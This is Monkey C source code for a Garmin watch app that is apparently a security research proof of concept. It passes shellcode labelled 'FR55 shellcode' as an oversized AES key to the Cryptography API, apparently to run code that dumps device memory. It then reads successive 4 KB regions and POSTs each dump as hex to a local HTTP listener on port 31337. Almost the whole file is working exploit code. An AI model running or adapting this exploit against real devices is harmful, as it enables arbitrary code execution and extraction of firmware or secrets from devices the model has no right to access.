import Toybox.Graphics;
import Toybox.WatchUi;
import Toybox.Application.Storage;
import Toybox.Communications;
import Toybox.Lang;
import Toybox.Cryptography;

class PoCView extends WatchUi.View {

    private var _count = 0;
    private var _running = false;
    private var textArea;
    private var baSize;
    public var ba;

    function initializeByteArray() {
        me.baSize = 0x1000;
        me.ba = new[me.baSize]b;
        
        me.ba[0] = 0x51;
        for (var i = 1; i < 0x1000; i++ ) {
            me.ba[i] = 0x52;
        }

        var storedCount = Storage.getValue("count");
        if (storedCount == null) {
            me._count = 0;
        } else {
            me._count = storedCount;
        }
    }

    function initialize() {
        View.initialize();
        me.initializeByteArray();
    }

    public function runExploit() {
        me.exploit();
        me.uploadDump();

        Storage.setValue("count", me._count);

        WatchUi.requestUpdate();
    }

    function exploit() {
        me.ba[0] = 0x51;
        for (var i = 1; i < 0x1000; i++ ) {
            me.ba[i] = 0x52;
        }

        var keyConvertOptions = {
            :fromRepresentation => StringUtil.REPRESENTATION_STRING_HEX,
            :toRepresentation => StringUtil.REPRESENTATION_BYTE_ARRAY
        };

        // FR55 shellcode
        var shellcode = "2d192b684345fbd1013d2b684345fbd0241ca41933682b6004360435a642f9d1bf46c0460010000000000120";
        shellcode += me._computeStartReadAddress();
        shellcode += "115812105252525200001020d1910020";

        var keyBytes = StringUtil.convertEncodedString(
            shellcode,
            keyConvertOptions
        );
        var ivBytes = StringUtil.convertEncodedString(
            "aaaaaaaaaaaaaaaabbbbbbbbbbbbbbbb",
            keyConvertOptions
        );

        try {
            var myCipher = new Cryptography.Cipher({
                    :algorithm => Cryptography.CIPHER_AES128,
                    :mode => Cryptography.MODE_ECB,
                    :key => keyBytes,
                    :iv => ivBytes
                });
        } catch ( ex ) {
            System.println("exploit successful");
        }
    }

    private function _computeStartReadAddress() {
        if (me._count < 0) {
            me._count = 0;
        }
        var offset = 0x1000 * me._count;
        // From https://stackoverflow.com/questions/19275955/convert-little-endian-to-big-endian
        var b0 = (offset & 0x000000ff) << 24;
        var b1 = (offset & 0x0000ff00) << 8;
        var b2 = (offset & 0x00ff0000) >> 8;
        var b3 = (offset & 0xff000000) >> 24;
        var offsetLittle = b0 | b1 | b2 | b3;

        return offsetLittle.format("%08x");
    }

    function uploadDump() {
        var keyConvertOptions = {
            :fromRepresentation => StringUtil.REPRESENTATION_BYTE_ARRAY,
            :toRepresentation => StringUtil.REPRESENTATION_STRING_HEX
        };

        var keyBytes = StringUtil.convertEncodedString(
            me.ba,
            keyConvertOptions);

        var offset = me._count * 0x1000;

        me.sendRequest(offset, offset + 0x1000, keyBytes);
    }

    function sendRequest(from, to, dump) as Void {
        var url = "http://127.0.0.1:31337/";

        var params = {
            "from" => from,
            "to" => to,
            "dump" => dump
        };

        var options = {
            :method => Communications.HTTP_REQUEST_METHOD_POST,
            :headers => {
                "Content-Type" => Communications.REQUEST_CONTENT_TYPE_JSON}
        };

        Communications.makeWebRequest(url, params, options, null);
    }

    public function incCount() {
        me._running = true;
        me._count++;
        me.runExploit();
    }

    public function decCount() {
        me._running = true;
        me._count--;
        if (me._count < 0) {
            me._count = 0;
        }
        me.runExploit();
    }

    public function resetCount() {
        Storage.setValue("count", 0);
        me._count = 0;
        me._running = false;
        WatchUi.requestUpdate();
    }

    function onUpdate(dc as Dc) as Void {
        var offset = me._count * 0x1000;
        var textDisplay = "";

        if (me._running == false) {
            textDisplay = Lang.format("Ready to read\n$1$\n-\n$2$", [offset.format("%06x"), (offset + 0x1000).format("%06x")]);
        } else {
            textDisplay = Lang.format("[$1$ - $2$]\n", [offset.format("%06x"), (offset + 0x1000).format("%06x")]);

            var keyConvertOptions = {
                :fromRepresentation => StringUtil.REPRESENTATION_BYTE_ARRAY,
                :toRepresentation => StringUtil.REPRESENTATION_STRING_HEX
            };
    
            var cpyKeyBytes = new[0x100]b;
            for (var i = 0; i < cpyKeyBytes.size() and i < me.ba.size(); i++) {
                cpyKeyBytes[i] = me.ba[i];
            }
            var keyBytes = StringUtil.convertEncodedString(
                cpyKeyBytes,
                keyConvertOptions);

            textDisplay += keyBytes.substring(0, 128);
        }


        me.textArea = new WatchUi.TextArea({
            :text=>textDisplay,
            :justification=>Graphics.TEXT_JUSTIFY_CENTER,
            :color=>Graphics.COLOR_WHITE,
            :font=>[Graphics.FONT_MEDIUM, Graphics.FONT_SMALL, Graphics.FONT_XTINY],
            :locX =>WatchUi.LAYOUT_HALIGN_CENTER,
            :locY=>WatchUi.LAYOUT_VALIGN_CENTER,
            :width=>160,
            :height=>160
        });

        dc.setColor(Graphics.COLOR_WHITE, Graphics.COLOR_BLACK);
        dc.clear();
        me.textArea.draw(dc);
    }
}
